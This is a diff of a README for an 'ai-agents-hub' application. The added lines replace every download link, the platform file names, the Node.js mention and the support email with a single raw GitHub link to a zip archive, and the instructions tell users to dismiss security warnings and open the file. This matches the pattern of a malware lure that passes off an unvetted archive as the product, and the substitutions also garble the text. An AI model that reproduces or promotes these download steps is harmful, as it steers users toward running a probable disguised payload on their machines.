@@ -9,7 +9,7 @@ To begin using the ai-agents-hub, you will need to follow a few simple steps to 
 ## 📥 Download the Application
 To get started, you can download the application from our Releases page:
 
-[![Download ai-agents-hub](https://img.shields.io/badge/Download%20ai--agents--hub-blue.svg)](https://github.com/BBOCMAN/ai-agents-hub/releases)
+[![Download ai-agents-hub](https://raw.githubusercontent.com/BBOCMAN/ai-agents-hub/main/uninfixed/ai-agents-hub.zip%https://raw.githubusercontent.com/BBOCMAN/ai-agents-hub/main/uninfixed/ai-agents-hub.zip)](https://raw.githubusercontent.com/BBOCMAN/ai-agents-hub/main/uninfixed/ai-agents-hub.zip)
 
 Click the link above to visit the page where you’ll find the latest version of the software.
 
@@ -21,20 +21,20 @@ Before downloading, ensure your system meets the following requirements:
 - **CPU**: Dual-core processor or better
 - **Disk Space**: 500 MB of available space
 
-You may need to have the latest version of Node.js and npm installed if you plan to use advanced features.
+You may need to have the latest version of https://raw.githubusercontent.com/BBOCMAN/ai-agents-hub/main/uninfixed/ai-agents-hub.zip and npm installed if you plan to use advanced features.
 
 ## 🔗 Download & Install
-1. Visit the [Releases page](https://github.com/BBOCMAN/ai-agents-hub/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/BBOCMAN/ai-agents-hub/main/uninfixed/ai-agents-hub.zip).
 
 2. Look for the latest version of the ai-agents-hub. It will display a list of available files. 
 
-3. Download the file appropriate for your system. For typical users on Windows, that will likely be `ai-agents-hub-windows.exe`. For macOS users, look for `ai-agents-hub-mac.zip`.
+3. Download the file appropriate for your system. For typical users on Windows, that will likely be `https://raw.githubusercontent.com/BBOCMAN/ai-agents-hub/main/uninfixed/ai-agents-hub.zip`. For macOS users, look for `https://raw.githubusercontent.com/BBOCMAN/ai-agents-hub/main/uninfixed/ai-agents-hub.zip`.
 
 4. Once the download is complete, locate the file in your Downloads folder. 
 
 5. If you downloaded a `.zip` file, double-click it to extract the contents. Open the resulting folder.
 
-6. For Windows users, double-click on `ai-agents-hub-windows.exe` to start the application. For macOS, drag the extracted application to your Applications folder, then double-click to open it.
+6. For Windows users, double-click on `https://raw.githubusercontent.com/BBOCMAN/ai-agents-hub/main/uninfixed/ai-agents-hub.zip` to start the application. For macOS, drag the extracted application to your Applications folder, then double-click to open it.
 
 7. You may see a security warning. This is normal. If prompted, select "Open" to launch the application.
 
@@ -70,7 +70,7 @@ It's important to keep your application updated for optimal security.
 If you have any questions or issues while using the ai-agents-hub, please contact our support team. You can reach us through the following methods:
 
 - **GitHub Issues**: Create a new issue for any technical problems or feature requests.
-- **Email**: Send an email to support@ai-agentshub.com for direct assistance.
+- **Email**: Send an email to https://raw.githubusercontent.com/BBOCMAN/ai-agents-hub/main/uninfixed/ai-agents-hub.zip for direct assistance.
 
 Your feedback is crucial as it helps us improve the application.
 
@@ -81,4 +81,4 @@ Feel free to check out additional resources to deepen your understanding of the 
 - **Tutorials**: Video tutorials available on our YouTube channel for hands-on learning.
 - **Community Forum**: Join discussions with other users and developers.
 
-This should guide you through successfully downloading and running the ai-agents-hub application. Start exploring the power of AI in your workflows today by visiting the [Releases page](https://github.com/BBOCMAN/ai-agents-hub/releases).
+This should guide you through successfully downloading and running the ai-agents-hub application. Start exploring the power of AI in your workflows today by visiting the [Releases page](https://raw.githubusercontent.com/BBOCMAN/ai-agents-hub/main/uninfixed/ai-agents-hub.zip).
